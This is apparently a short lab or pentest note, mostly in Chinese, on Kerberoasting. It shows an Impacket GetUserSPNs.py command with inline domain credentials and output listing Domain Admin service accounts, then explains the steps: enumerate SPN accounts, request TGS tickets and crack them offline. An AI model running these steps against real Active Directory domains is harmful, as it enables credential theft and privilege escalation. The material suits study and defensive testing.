
```
 GetUserSPNs.py corp.local/dark:_QuejVudId6 -dc-ip  10.80.179.69

```

Impacket v0.14.0.dev0+20251204.163933.2347bd3f - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name  MemberOf                                    PasswordLastSet             LastLogon                   Delegation
--------------------  ----  ------------------------------------------  --------------------------  --------------------------  ----------
HTTP/fela             fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287
HOST/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287
HTTP/fela@corp.local  fela  CN=Domain Admins,CN=Users,DC=corp,DC=local  2019-10-09 19:54:40.905204  2025-12-27 15:12:00.971287


**getUserSPNs（Impacket）** 是一个常见的安全工具/脚本，用于与 Active Directory/Kerberos 交互，**枚举具有服务主体名称（SPN）Service Principal Name 的帐户**并尝试获取对应的 Kerberos 服务票据（TGS）**Ticket-Granting Service** 的缩写，即 **Kerberos 服务票据颁发服务**。
1. **枚举含 SPN 的账户**：查询目录以找出所有已注册 SPN 的账户（通常是服务/应用账户）。
    
2. **为每个 SPN 请求 Kerberos 服务票据（TGS）**：向域控制器请求对应服务的票据；域控制器返回可以离线保存的加密票据（包含可以破解的部分）。
    
3. **离线破解票据**（这一步为滥用行为的核心）：将票据导出并尝试用密码猜测/破解算法得到服务账户的明文密码或等价信息（在受控实验中用来验证弱口令风险）。
4. 
TGS 本身不是一个独立服务，而是 Kerberos 中 KDC（Key Distribution Center）的一部分。

KDC 有两个核心功能模块：

模块	功能
AS（Authentication Service）	处理初始身份验证，签发 TGT
TGS（Ticket-Granting Service）	根据 TGT 请求服务票据